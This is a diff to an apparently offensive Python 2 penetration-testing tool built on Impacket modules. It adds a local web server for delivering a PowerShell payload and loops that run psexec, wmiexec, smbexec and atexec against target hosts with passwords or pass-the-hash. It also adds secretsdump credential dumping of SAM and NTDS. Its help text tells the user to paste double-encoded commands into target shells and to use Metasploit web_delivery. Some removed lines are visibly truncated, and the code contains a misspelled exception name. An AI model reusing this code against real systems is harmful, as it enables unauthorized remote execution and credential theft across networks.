@@ -28,7 +28,7 @@ INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT
 LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
 OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 '''
-import base64, sys, argparse, re
+import base64, sys, argparse, re, subprocess, os
 
 try:
     import netifaces
@@ -238,6 +238,11 @@ def hash_test(LM, NTLM, pwd):
     pwd = ""
     return(LM, NTLM, pwd, hash)
 
+def http_server(port, working_dir):
+    null = open('/dev/null', 'w')
+    sub_proc = subprocess.Popen([sys.executable, '-m', 'SimpleHTTPServer', port], cwd=working_dir, stdout=null, stderr=null,)
+    #sleep(1)
+    return sub_proc
 
 def main():
     # If script is executed at the CLI
@@ -358,9 +363,14 @@ Create Pasteable Double Encoded Script:
     method_dict = {}
     dst = ""
 
+    # Get details for catapult server
+    cwd = str(os.path.dirname(payload))
+    if "/" not in cwd:
+        cwd = str(os.getcwd())
+    payload = os.path.splitext(payload)
     if aes != None:
         kerberos = True
-
+    payload = ''.join(payload)
     if filename:
         payload = filename
 
@@ -484,13 +494,13 @@ Create Pasteable Double Encoded Script:
         attacks = False
 
     if "invoker" in execution and not wmiexec_cmd:
-        supplement = '''[*] Place the PowerShell script ''' + payload + ''' in an empty directory.
-[*] Start-up your Python web server as follows Python SimpleHTTPServer ''' + src_port + '''.'''
+        supplement = '''[*] Place the PowerShell script ''' + str(payload) + ''' in an empty directory.
+[*] Start-up your Python web server as follows Python SimpleHTTPServer ''' + str(src_port) + '''.'''
     elif "downloader" in execution and not wmiexec_cmd:
         supplement = '''[*] If you have not already done this, start-up your Metasploit module exploit/multi/script/web_delivery.
 [*] Make sure to select the PowerShell and copy the payload name for this script and set the URIPATH to /.'''
     elif "group" in execution and not wmiexec_cmd:
-        supplement = '''[*] This script will identify Members of the Group: ''' + group + ''' with PowerShell.'''
+        supplement = '''[*] This script will identify Members of the Group: ''' + str(group) + ''' with PowerShell.'''
     instructions = supplement + '''
 [*] Then copy and paste the following command into the target boxes command shell.
 [*] This execution script is double encoded.
@@ -500,15 +510,25 @@ Create Pasteable Double Encoded Script:
         sys.exit("[!] You do not execute the --secrets-dump with a method, it should be executed on its own.")
     if not final_targets:
         sys.exit("[!] No targets to exploit")
-    for dst in final_targets:
-        if psexec_cmd:
+    if psexec_cmd:
+        for dst in final_targets:
+            if attacks:
+                srv = http_server(src_port, cwd)
+                print("[*] Starting web server on port %s in %s" ) % (str(src_port), str(cwd))
             if hash:
                 print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
             else:
                 print("[*] Attempting to access the system %s with, user: %s pwd: %s domain: %s ") % (dst, usr, pwd, dom)
             attack=psexec.PSEXEC(command, path=directory, protocols=protocol, username = usr, password = pwd, domain = dom, hashes = hash, copyFile = None, exeFile = None, aesKey = aes, doKerberos = kerberos)
             attack.run(dst)
-        elif wmiexec_cmd:
+            if attacks:
+                srv.terminate()
+                print("[*] Shutting down the catapult web server")
+    elif wmiexec_cmd:
+        for dst in final_targets:
+            if attacks:
+                srv = http_server(src_port, cwd)
+                print("[*] Starting web server on port %s in %s") % (str(src_port), str(cwd))
             if hash:
                 print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
             else:
@@ -521,35 +541,62 @@ Create Pasteable Double Encoded Script:
             else:
                 attack=wmiexec.WMIEXEC(command, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, share = share, noOutput = no_output, doKerberos=kerberos)
                 attack.run(dst)
-        elif smbexec_cmd:
+            if attacks:
+                srv.terminate()
+                print("[*] Shutting down the catapult web server")
+    elif smbexec_cmd:
+        for dst in final_targets:
+            if attacks:
+                srv = http_server(src_port, cwd)
+                print("[*] Starting web server on port %s in %s") % (str(src_port), str(cwd))
             if hash:
                 print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
             else:
                 print("[*] Attempting to access the system %s with, user: %s pwd: %s domain: %s ") % (dst, usr, pwd, dom)
             attack=smbexec.CMDEXEC(protocols = protocol, username = usr, password = pwd, domain = dom, hashes = hash,  aesKey = aes, doKerberos = kerberos, mode = mode, share = share)
             attack.run(dst)
-        elif atexec_cmd:
+            if attacks:
+                srv.terminate()
+                print("[*] Shutting down the catapult web server")
+    elif atexec_cmd:
+        for dst in final_targets:
+            if attacks:
+                srv = http_server(src_port, cwd)
+                print("[*] Starting web server on port %s in %s") % (str(src_port), str(cwd))
             if hash:
                 print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
             else:
-                print("[*] Attempting to access the system %s with, user: %s pwd
+                print("[*] Attempting to access the system %s with, user: %s pwd: %s domain: %s ") % (dst, usr, pwd, dom)
             if command == "cmd.exe":
                 sys.exit("[!] Please provide a viable command for execution")
-            attack=atexec.ATSVC_EXEC(username = usr, password = pwd, domain = do
+            attack=atexec.ATSVC_EXEC(username = usr, password = pwd, domain = dom, command = command)
             attack.play(dst)
-        elif sam_dump:
+            if attacks and not encoder:
+                if hash:
+                    print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
+                else:
+                    print("[*] Attempting to access the system %s with, user: %s pwd: %s domain: %s ") % (dst, usr, pwd, dom)
+                if command == "cmd.exe":
+                    sys.exit("[!] Please provide a viable command for execution")
+                attack=atexec.ATSVC_EXEC(username = usr, password = pwd, domain = dom, command = unprotected_command)
+                attack.play(dst)
+            if attacks:
+                srv.terminate()
+                print("[*] Shutting down the catapult web server")
+    elif sam_dump:
+        for dst in final_targets:
             if hash:
-                print("[*] Attempting to access the system %s with, user: %s has
+                print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
             else:
-                print("[*] Attempting to access the system %s with, user: %s pwd
-            attack=secretsdump.DumpSecrets(address = dst, username = usr, passwo                                                                                        tem, security = security, sam = sam, ntds = ntds)
+                print("[*] Attempting to access the system %s with, user: %s pwd: %s domain: %s ") % (dst, usr, pwd, dom)
+            attack=secretsdump.DumpSecrets(address = dst, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, doKerberos = kerberos, system = system, security = security, sam = sam, ntds = ntds)
             try:
                 attack.dump()
             except Execption, e:
                 print("[!] An error occured during execution")
-        else:
-            print(instructions)
-            print(x.return_command())
+    else:
+        print(instructions)
+        print(x.return_command())
 
 if __name__ == '__main__':
     main()
